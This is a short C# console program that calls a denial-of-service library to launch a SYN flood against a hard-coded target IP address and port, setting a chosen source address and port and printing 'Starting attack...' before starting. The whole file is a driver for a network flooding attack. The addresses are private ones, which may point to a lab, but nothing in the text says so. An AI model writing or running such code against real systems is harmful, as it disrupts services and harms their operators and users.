// See https://aka.ms/new-console-template for more information

using LD.InfoSec.Network.DoS;

Console.WriteLine("Starting attack...");
DosAttack attack = new(new()
{
    Size = 1,
    DosType = DosType.SynFlood,
    SourcePort = 60270,
    TargetIp = "172.20.71.194",
    SourceIp = "192.168.86.150",
    TargetPort = 9999,
});

await attack.Start();